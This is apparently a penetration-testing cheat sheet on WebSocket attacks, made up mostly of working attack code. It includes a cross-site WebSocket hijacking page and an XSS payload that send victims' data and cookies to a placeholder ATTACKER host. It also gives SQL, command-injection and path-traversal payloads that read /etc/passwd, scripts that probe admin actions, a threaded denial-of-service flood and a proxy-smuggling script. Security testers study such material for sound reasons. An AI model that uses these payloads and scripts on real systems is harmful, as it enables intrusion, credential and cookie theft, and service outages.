# WebSocket Attack Techniques

## Overview

```
# WebSockets provide full-duplex communication over a single TCP connection.
# Common vulnerabilities:
# - Missing authentication/authorization on WS endpoints
# - Cross-Site WebSocket Hijacking (CSWSH)
# - Injection attacks via WS messages
# - Insecure origin validation
# - Information disclosure
```

## Reconnaissance

```javascript
// Discover WebSocket endpoints:
// 1. Check page source for "ws://" or "wss://" URLs
// 2. Check Network tab in DevTools (filter: WS)
// 3. Check JavaScript files for WebSocket constructors

// Common endpoints:
ws://TARGET/ws
ws://TARGET/socket
ws://TARGET/socket.io/?EIO=4&transport=websocket
ws://TARGET/api/ws
ws://TARGET/realtime
wss://TARGET/graphql  // GraphQL subscriptions
```

## Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- If server doesn't validate Origin header, attacker page can connect -->
<!-- This is the WebSocket equivalent of CSRF -->

<script>
var ws = new WebSocket('wss://vulnerable.com/ws');

ws.onopen = function() {
    // Victim's cookies are sent automatically
    ws.send('{"action":"get_profile"}');
};

ws.onmessage = function(event) {
    // Exfiltrate data to attacker
    fetch('https://ATTACKER/steal?data=' + encodeURIComponent(event.data));
};
</script>

<!-- Hosted on attacker site, victim visits this page while authenticated -->
```

### Testing CSWSH

```python
import websocket

# Test with no Origin
ws = websocket.WebSocket()
ws.connect("wss://TARGET/ws")
print("[*] Connected without Origin header")

# Test with wrong Origin
ws = websocket.WebSocket()
ws.connect("wss://TARGET/ws",
           origin="https://evil.com")
print("[*] Connected with evil Origin")

# If connection succeeds → vulnerable to CSWSH
```

## Injection via WebSocket Messages

### SQL Injection
```json
// If WS messages are used in SQL queries:
{"action": "search", "query": "' OR 1=1--"}
{"action": "search", "query": "' UNION SELECT username,password FROM users--"}
```

### XSS via WebSocket
```json
// If WS messages are reflected in the page:
{"message": "<img src=x onerror=alert(document.cookie)>"}
{"message": "<script>fetch('https://ATTACKER/'+document.cookie)</script>"}
```

### Command Injection
```json
// If WS messages are passed to system commands:
{"action": "ping", "host": "127.0.0.1; id"}
{"action": "ping", "host": "$(cat /etc/passwd)"}
```

### Path Traversal
```json
// If WS messages reference files:
{"action": "download", "file": "../../../etc/passwd"}
```

## Authorization Testing

```python
import websocket
import json

ws = websocket.WebSocket()
ws.connect("wss://TARGET/ws")

# Test accessing admin functions as regular user
payloads = [
    {"action": "list_users"},
    {"action": "delete_user", "id": 1},
    {"action": "update_role", "user": "attacker", "role": "admin"},
    {"action": "get_config"},
    {"action": "execute", "command": "whoami"},
]

for p in payloads:
    ws.send(json.dumps(p))
    result = ws.recv()
    print(f"[*] {p['action']}: {result[:200]}")
```

## Socket.IO Specific

```javascript
// Socket.IO uses WebSocket with fallback to polling
// Connect and enumerate events:

const io = require("socket.io-client");
const socket = io("https://TARGET", {
    transports: ["websocket"],
    // Try without auth token
});

socket.onAny((event, ...args) => {
    console.log(`[*] Event: ${event}`, args);
});

socket.on("connect", () => {
    console.log("[+] Connected:", socket.id);

    // Try common events
    socket.emit("admin", {action: "list_users"});
    socket.emit("debug", {verbose: true});
    socket.emit("message", "<script>alert(1)</script>");
});
```

## Denial of Service

```python
import websocket
import threading
import time

def flood(target, n):
    try:
        ws = websocket.WebSocket()
        ws.connect(target)
        for _ in range(n):
            ws.send("A" * 65536)  # Large messages
        ws.close()
    except:
        pass

# Many connections + large messages
target = "wss://TARGET/ws"
threads = []
for _ in range(100):
    t = threading.Thread(target=flood, args=(target, 1000))
    t.start()
    threads.append(t)
```

## WebSocket Smuggling

```python
# Some reverse proxies don't properly handle WebSocket upgrade
# Can be used to bypass WAF/proxy restrictions

import socket
import ssl

sock = socket.create_connection(("TARGET", 443))
sock = ssl.wrap_socket(sock)

# Send WebSocket upgrade
upgrade = (
    "GET /ws HTTP/1.1\r\n"
    "Host: TARGET\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n\r\n"
)
sock.send(upgrade.encode())
response = sock.recv(4096)

# After upgrade, send raw HTTP through the WebSocket tunnel
# This bypasses proxy-level restrictions
smuggled = (
    "GET /admin HTTP/1.1\r\n"
    "Host: internal-service\r\n\r\n"
)
sock.send(smuggled.encode())
```

## Tools

```
# wscat — WebSocket CLI client
wscat -c wss://TARGET/ws
wscat -c wss://TARGET/ws -H "Cookie: session=TOKEN"

# websocat — advanced WS client
websocat wss://TARGET/ws

# Burp Suite — intercept WS messages via Proxy > WebSockets history

# OWASP ZAP — WebSocket fuzzer built-in

# ws-harness — WebSocket to HTTP bridge for Burp/sqlmap
# https://github.com/mfowl/ws-harness
python ws-harness.py -u wss://TARGET/ws -m '{"query":"FUZZ"}'
# Then point sqlmap at the local HTTP bridge
```
